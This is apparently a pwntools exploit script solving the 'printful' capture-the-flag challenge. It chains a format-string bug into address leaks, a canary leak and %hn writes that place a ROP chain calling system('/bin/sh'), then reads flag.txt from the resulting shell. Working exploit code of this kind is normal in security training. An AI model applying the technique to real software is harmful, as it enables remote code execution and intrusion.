#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "printful.challs.pwnoh.io"
# exe = context.binary = ELF('./chall', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl=True)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
p.sendlineafter(b'> ', b'%39$p')
canary = int(p.recvline(), 16)
log.info("Canary: " + hex(canary))

p.sendlineafter(b'> ', b'%40$p')
stack_leak = int(p.recvline(), 16)
log.info("Stack leak: " + hex(stack_leak))

p.sendlineafter(b'> ', b'%43$p')
libc_leak = int(p.recvline(), 16)
log.info("Libc leak: " + hex(libc_leak))

p.sendlineafter(b'> ', b'%47$p')
exe_leak = int(p.recvline(), 16)
log.info("Exe leak: " + hex(exe_leak))

p.sendlineafter(b'> ', b'%28$p')
std_leak = int(p.recvline(), 16)
log.info("Std leak: " + hex(std_leak))

payload = b'%8$s|%9$s|%10$s'.ljust(0x10, b'\0')
payload += p64(std_leak - 8) + p64(std_leak) + p64(std_leak + 8)
p.sendlineafter(b'> ', payload)
p.recv(7)
stdout = u64(p.recv(6) + b'\0'*2)
log.info("Stdout: " + hex(stdout))

payload = b'%7$s'.ljust(8, b'\0')
payload += p64(stdout + 0x68)
p.sendlineafter(b'> ', payload)
stdin = u64(p.recv(6) + b'\0'*2)
log.info("Stdin: " + hex(stdin))

libc_base = stdin - 0x1ec980
bin_sh = libc_base + 0x1b45bd
log.info("bin_sh: " + hex(bin_sh))
payload = b'%7$s'.ljust(0x8, b'\0')
payload += p64(bin_sh)
p.sendline(payload)

pop_rdi = 0x23b6a + libc_base
system = 0x052290 + libc_base
ret = pop_rdi + 1
log.info("Pop rdi: " + hex(pop_rdi))
log.info("System: " + hex(system))

payload = f'%{pop_rdi & 0xffff}c%8$hn'.encode().ljust(0x10, b'\0')
payload += p64(stack_leak + 8)
p.sendlineafter(b'> ', payload)

# bin_sh
package = {
    bin_sh & 0xffff: stack_leak + 0x10,
    bin_sh >> 16 & 0xffff: stack_leak + 0x10 + 2,
    bin_sh >> 32 & 0xffff: stack_leak + 0x10 + 4
}
order = sorted(package)
payload = f'%{order[0]}c%11$hn'.encode()
payload += f'%{order[1] - order[0]}c%12$hn'.encode()
payload += f'%{order[2] - order[1]}c%13$hn'.encode()
payload = payload.ljust(0x28, b'\0')
payload += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
p.sendlineafter(b'> ', payload)

# ret
package = {
    ret & 0xffff: stack_leak + 0x18,
    ret >> 16 & 0xffff: stack_leak + 0x18 + 2,
    ret >> 32 & 0xffff: stack_leak + 0x18 + 4
}
order = sorted(package)
payload = f'%{order[0]}c%11$hn'.encode()
payload += f'%{order[1] - order[0]}c%12$hn'.encode()
payload += f'%{order[2] - order[1]}c%13$hn'.encode()
payload = payload.ljust(0x28, b'\0')
payload += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
p.sendlineafter(b'> ', payload)

# system
package = {
    system & 0xffff: stack_leak + 0x20,
    system >> 16 & 0xffff: stack_leak + 0x20 + 2,
    system >> 32 & 0xffff: stack_leak + 0x20 + 4
}
order = sorted(package)
payload = f'%{order[0]}c%11$hn'.encode()
payload += f'%{order[1] - order[0]}c%12$hn'.encode()
payload += f'%{order[2] - order[1]}c%13$hn'.encode()
payload = payload.ljust(0x28, b'\0')
payload += p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]])
p.sendlineafter(b'> ', payload)

for i in range(42, 50):
    p.sendline(f'%{i}$p'.encode())

p.sendline(b'q')

p.sendline(b'cat flag.txt')

p.interactive()
# ncat --ssl printful.challs.pwnoh.io 1337

# https://libc.blukat.me/?q=_IO_2_1_stdout_%3A6a0%2C_IO_2_1_stdin_%3A980%2Cstr_bin_sh%3A5bd&l=libc6_2.31-0ubuntu9.8_amd64